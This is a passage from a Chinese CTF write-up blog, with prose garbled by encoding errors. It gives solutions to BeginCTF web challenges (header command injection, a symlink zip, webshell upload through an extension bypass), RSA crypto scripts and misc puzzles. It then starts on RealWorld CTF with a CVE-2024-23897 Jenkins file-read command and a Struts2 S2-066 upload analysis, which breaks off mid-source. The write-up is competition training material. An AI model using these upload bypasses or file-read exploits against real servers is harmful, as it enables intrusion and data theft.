class="line"></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ä½¿ç”¨äº†<code>exec</code>å‡½æ•°ç”¨<code>unzip</code>è§£å‹ï¼Œè¿™é‡Œæœ‰ä¸¤ç§åšæ³•ï¼Œåšæ³•äºŒçš„æ¼”ç¤ºæ”¾åœ¨<strong>zupload-pro-plus-max-ultra-premium</strong>è¿™ä¸€é¢˜ã€‚</p><p><strong>è§£æ³•ä¸€ï¼š</strong></p><p>æ§åˆ¶<code>$extract_to</code>å‚æ•°ï¼Œå¯ä»¥åˆ©ç”¨æˆªæ–­æ¥æ‰§è¡Œæ–°çš„å‘½ä»¤ã€‚æŠŠå‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå†™åˆ°æ–‡ä»¶é‡Œï¼Œå¯ä»¥å®ç°rceã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$extract_to = $_SERVER[&#x27;HTTP_X_EXTRACT_TO&#x27;] ?? &#x27;uploads/&#x27;;</span><br></pre></td></tr></table></figure><p><code>$extract_to</code>å‚æ•°æ˜¯é€šè¿‡httpå¤´<code>X-EXTRACT-TO</code>ä¼ å…¥çš„ï¼Œå› æ­¤æ§åˆ¶è¿™ä¸ªå³å¯ã€‚</p><p><img src="/./BeginCTF/w_7_1.png"></p><p>è®¿é—®<code>1</code>ï¼Œå³å¯çœ‹åˆ°flagã€‚</p><p><img src="/./BeginCTF/w_7_2.png"></p><h2 id="zupload-pro-plus-max-ultra-premium"><a href="#zupload-pro-plus-max-ultra-premium" class="headerlink" title="zupload-pro-plus-max-ultra-premium"></a>zupload-pro-plus-max-ultra-premium</h2><p>å› ä¸ºæ˜¯ç”¨çš„<code>unzip</code>è§£å‹ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è½¯é“¾æ¥æ¥é“¾æ¥åˆ°æ ¹ç›®å½•çš„flagã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_73767109/article/details/131033346">CTFSHOWå›½èµ›å¤ç°â€”â€“Unzip(è½¯è¿æ¥åˆ©ç”¨)</a></p><p>å…ˆå‹ç¼©ä¸€ä¸ªè½¯é“¾æ¥ ã€‚</p><p><img src="/./BeginCTF/w_8_1.png"></p><p>ç„¶åæŠŠå‹ç¼©åŒ…ä¸Šä¼ ï¼Œä¹‹åè®¿é—®<code>/uploads/flag</code>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./BeginCTF/w_8_2.png"></p><h2 id="zupload-pro-revenge"><a href="#zupload-pro-revenge" class="headerlink" title="zupload-pro-revenge"></a>zupload-pro-revenge</h2><p>åªæœ‰å‰ç«¯è¿‡æ»¤ï¼ŒæŠ“åŒ…æ”¹åç¼€å³å¯ã€‚</p><p><img src="/./BeginCTF/w_9_1.png"></p><p>ä¹‹åè®¿é—®<code>/uploads/shell.php</code>å³å¯rceã€‚</p><p><img src="/./BeginCTF/w_9_2.png"></p><h2 id="zupload-pro-plus-enhanced"><a href="#zupload-pro-plus-enhanced" class="headerlink" title="zupload-pro-plus-enhanced"></a>zupload-pro-plus-enhanced</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿè¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯¹æ–‡ä»¶åçš„å¤„ç†æ˜¯ä»¥<code>.</code>ä¸ºåˆ†å‰²æŠŠæ–‡ä»¶ååˆ†æˆæ•°ç»„ï¼Œå†åˆ¤æ–­è¿™ä¸ªæ•°ç»„å­˜ä¸å­˜åœ¨<code>zip</code>å­—ç¬¦ä¸²ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ª<code>shell.zip.php</code>çš„æ–‡ä»¶å³å¯æ»¡è¶³æ¡ä»¶ã€‚</p><p><img src="/./BeginCTF/w_10_1.png"></p><p>è®¿é—®<code>/uploads/shell.zip.php</code>å³å¯rceã€‚</p><p><img src="/./BeginCTF/w_10_2.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="fake-n"><a href="#fake-n" class="headerlink" title="fake_n"></a>fake_n</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fakeN_list</span>():</span><br><span class="line">    puzzle_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        r = getPrime(<span class="number">32</span>)</span><br><span class="line">        puzzle_list.append(r)</span><br><span class="line"></span><br><span class="line">    p = getPrime(<span class="number">32</span>)</span><br><span class="line">    q = getPrime(<span class="number">32</span>)</span><br><span class="line">    com = p*q</span><br><span class="line"></span><br><span class="line">    puzzle_list.append(com)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> puzzle_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,e,fake_n_list</span>):</span><br><span class="line"></span><br><span class="line">    fake_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">        fake_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    really_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)-<span class="number">1</span>):</span><br><span class="line">        really_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,really_n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;fake_n =&quot;</span>,fake_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fake_n_list = fakeN_list()</span><br><span class="line">    encrypt(m,e,fake_n_list)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"><span class="string">fake_n = 178981104694777551556050210788105224912858808489844293395656882292972328450647023459180992923023126555636398409062602947287270007964052060975137318172446309766581</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>å…ˆç”¨yafuåˆ†è§£<code>fake_n</code>ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªè¯•å³å¯ã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">c,e,phi,n</span>):</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"></span><br><span class="line">N = [<span class="number">3429664037</span>,<span class="number">2290486867</span>,<span class="number">2333428577</span>,<span class="number">3417707929</span>,<span class="number">4098704749</span>,<span class="number">3278987191</span>,<span class="number">3965529989</span>,<span class="number">3716624207</span>,<span class="number">4267348123</span>,<span class="number">2507934301</span>,<span class="number">2215221821</span>,<span class="number">3389689241</span>,<span class="number">2446301969</span>,<span class="number">2590663067</span>,<span class="number">3107210929</span>,<span class="number">2361589081</span>,<span class="number">3859354699</span>]</span><br><span class="line"></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> N:</span><br><span class="line">    n *= i</span><br><span class="line">    phi = (i-<span class="number">1</span>)*phi</span><br><span class="line">    flag = decode(c,e,phi,n)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;begin&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;y0u_f1nd_th3_re4l_n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PAD"><a href="#PAD" class="headerlink" title="PAD"></a>PAD</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, math</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">flag=flag[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span></span>):</span><br><span class="line">        self.p, self.q, self.e, self.m = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>), getRandomRange(<span class="number">1</span>,<span class="number">8</span>), m</span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Publickey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.n, self.e,self.c)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        pad = PAD(m=self.m, e=<span class="number">0</span>)</span><br><span class="line">        pad.PAD()</span><br><span class="line">        self.c = (pad.e,<span class="built_in">pow</span>(pad.M, self.e, self.n))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PAD</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span>, e</span>):</span><br><span class="line">        self.e, self.m, self.mbits = e, m, m.bit_length()</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">            self.e = getRandomRange(<span class="number">2</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PAD</span>(<span class="params">self</span>):</span><br><span class="line">        self.M = <span class="built_in">pow</span>(self.e, self.mbits) + <span class="built_in">pow</span>(self.m, self.e)</span><br><span class="line">GIFT = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;GIFT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        rsa = RSA(m=GIFT)</span><br><span class="line">        rsa.Encrypt()</span><br><span class="line">        f.write(<span class="built_in">str</span>(rsa.Publickey()) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹<code>GIFT.txt</code>ï¼Œæœ‰ç±»ä¼¼è¿™æ ·çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(105489743033600776618404736924014082773234739025040235918547880079849719971737127359304073614094075884043630513694448370483208184306027684643273284267932051217742004175757404293643624264846421545917186078199365762796141089940330731024030929168374696605389962930325106070659194496163327222019090112724836643593, 1, (2, 26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129))</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢æºç åˆ†æï¼Œå¦‚æœrsaçš„e&#x3D;1æ—¶ï¼Œè¾“å‡ºçš„cå¤§æ¦‚ç‡æ˜¯mã€‚</p><p>å¯¹äº<code>PAD</code>éƒ¨åˆ†ï¼Œå¾ˆæ˜¾ç„¶<code>pow(self.m, self.e)</code> è¿œå¤§äº <code>pow(self.e, self.mbits)</code>ï¼Œé‚£å½“e&#x3D;2æ—¶ï¼Œå¼€æ ¹å·å–æ•´å³å¯å¾—åˆ°flagã€‚</p><p>è¿™é‡Œéœ€è¦è€ƒè™‘å¼€æ ¹å·åæµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜ï¼Œè¦ç”¨<code>gmpy2.isqrt</code>æ¥å¼€æ ¹å·ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = <span class="number">26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(gmpy2.isqrt(m))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;8E6C79D2-E960-C57A-F3E4-A52BC827ED6B_Dragon_Year_happy!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezRsa"><a href="#ezRsa" class="headerlink" title="ezRsa"></a>ezRsa</h2><p>eå¾ˆå°ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´kå¼€å¹³æ–¹å¾—åˆ°m</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161</span></span><br><span class="line">c = <span class="number">5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(k*n+c,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(res[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;begin&#123;quadr4ticresidue_i5_s0_3asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="real-check-in"><a href="#real-check-in" class="headerlink" title="real check in"></a>real check in</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸ºäº†é€‰æ‰‹æœ‰æ›´å¥½çš„æ¸¸ç©ä½“éªŒè¯·åŠæ—¶åŠ å…¥beginctf2024å®˜æ–¹ç¾¤,ç¾¤å·:612995005</span><br><span class="line"></span><br><span class="line">ä»catf1yçš„ç¬”è®°æœ¬ä¸­å‘ç°äº†è¿™ä¸ªç¥ç§˜çš„ä»£ç MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</span><br><span class="line"></span><br><span class="line">ä½ èƒ½å¸®åŠ©æˆ‘æ‰¾åˆ°æœ€åçš„flagå—?</span><br><span class="line"></span><br><span class="line">Author: BeginCTF2024</span><br><span class="line"></span><br><span class="line">Difficult: baby</span><br></pre></td></tr></table></figure><p>base32è§£ç å³å¯å¾—åˆ°flagã€‚</p><h2 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h2><p>æŠŠtxtçš„å†…å®¹æ‹¼æ¥èµ·æ¥ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸²æ•°å­—</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getstr</span>(<span class="params">filename</span>):</span><br><span class="line">    a = <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(a)</span><br><span class="line">    </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">672</span>:</span><br><span class="line">    flag+=getstr(<span class="string">&#x27;./tupper/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">    i+=<span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸²æ•°å­—æ”¾åˆ° <a href="https://tuppers-formula.ovh/">Tupperâ€™s Formula Tools</a> ç”»å›¾ï¼Œå³å¯å¾—åˆ°flagã€‚</p><p><img src="/./BeginCTF/m_2_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RealWorld wp</title>
      <link href="/RealWorld/"/>
      <url>/RealWorld/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h2><p>ä¿¡æ¯æ”¶é›†ï¼Œè¿™æ˜¯ä¸€ä¸ª<code>Jenkins</code>çš„ç½‘ç«™</p><p><img src="/./RealWorld/w_1_1.png"></p><p>å¾®ä¿¡æœè¿™ä¸ªç½‘ç«™çš„æ¼æ´ï¼Œå¯ä»¥å¾—åˆ°<code>Jenkins ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆCVE-2024-23897)</code></p><p><a href="https://mp.weixin.qq.com/s/ZIJYx5sYlpViWQFNUAoaHg">CVE-2024-23897ï½œJenkinsä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆPOCï¼‰</a></p><p>å…ˆä¸‹è½½ä¸€ä¸ª <a href="http://jenkins:8080//jnlpJars/jenkins-cli.jar">jenkins-cli.jar</a></p><p>ä¹‹åæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://47.96.171.129:8080/ who-am-i &quot;@/flag&quot;</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./RealWorld/w_1_2.png"></p><h2 id="Be-More-Elegant"><a href="#Be-More-Elegant" class="headerlink" title="Be-More-Elegant"></a>Be-More-Elegant</h2><p>Struts2 æ–‡ä»¶ä¸Šä¼  S2-066</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066)</a></p><p>å…ˆçœ‹æºç ï¼š</p><p><strong>JspFilter</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JspFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> ((HttpServletRequest)request).getServletPath();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/views&quot;</span>) || !path.endsWith(<span class="string">&quot;jsp&quot;</span>) &amp;&amp; !path.endsWith(<span class="string">&quot;jspx&quot;</span>)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;jsp not allowed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HeaderIconAction</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.action.ServletRequestAware;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeaderIconAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestAware</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">File</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(HeaderIconAction.class.getClassLoader().getResource(<span class="string">&quot;../../statics/&quot;</span>).getFile(), <span class="string">&quot;uploads&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="keyword">private</span> String uploadedPath;</span><br><span class="line">    <span 